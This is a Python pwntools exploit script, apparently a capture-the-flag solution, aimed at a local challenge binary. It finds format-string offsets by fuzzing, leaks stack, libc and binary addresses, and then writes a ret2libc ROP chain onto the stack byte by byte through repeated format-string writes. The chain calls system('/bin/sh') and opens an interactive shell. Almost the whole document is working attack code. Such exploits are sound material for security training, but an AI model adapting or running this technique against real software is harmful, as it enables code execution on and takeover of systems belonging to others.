#!/usr/bin/env python3

from pwn import *

exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]


def fuzzer():
    context.log_level = "warning"
    for i in range(100):
        io = process(exe)
        io.sendlineafter(b"name >> ", b"")
        io.sendlineafter(b"wish >> ", f"%{i}$p")
        res = io.recvline().strip().decode()
        print(f"{i}: {res}")
        io.close()


# 1: 0x7fffd6b07960 # stk
# 3: 0x7f973c51ba91 # libc
# 6: 0xa70243625    # offset
# 9: 0x561a5a69b3d2 # bin

stkOffset = 0x28
libcOffset = 0x11BA91
binOffset = 0x13AC

context.log_level = "debug"
# io = gdb.debug(exe, "brva 0x138b\nc")
io = process(exe)

# leak stk, libc, and elf addresses
payload = flat({0: b"%9$p", 16: p8(0xCD)})  # jump to main's cave() call
io.sendafter(b"name >> ", payload)
io.sendafter(b"wish >> ", b"%1$p%3$p")
stkLeak = int(io.recv(14), 16)
libc.address = int(io.recv(14), 16) - libcOffset
elf.address = int(io.recv(14), 16) - binOffset
info("stkLeak: %#x", stkLeak)
info("libcBase: %#x", libc.address)
info("elfBase: %#x", elf.address)

# ret2libc rop chain
rop = ROP(libc)
rop.raw(rop.rdi.address)
rop.raw(next(libc.search(b"/bin/sh\x00")))
rop.raw(rop.ret.address)
rop.raw(libc.sym.system)
chain = rop.chain()

# write our rop chain onto the libc return address byte by byte
# this only works because we skip main's additional stack allocation
for i in range(0, len(chain)):
    fmstr = fmtstr_payload(offset=6, writes={stkLeak + stkOffset + i: chain[i : i + 1]})
    payload1 = flat({0: fmstr[8:], 16: p8(0xCD)})
    payload2 = fmstr[:8]
    io.sendafter(b"name >> ", payload1)
    io.sendafter(b"wish >> ", payload2)

io.sendafter(b"name >> ", b"exploit")
io.sendafter(b"wish >> ", b"pls")
io.interactive()
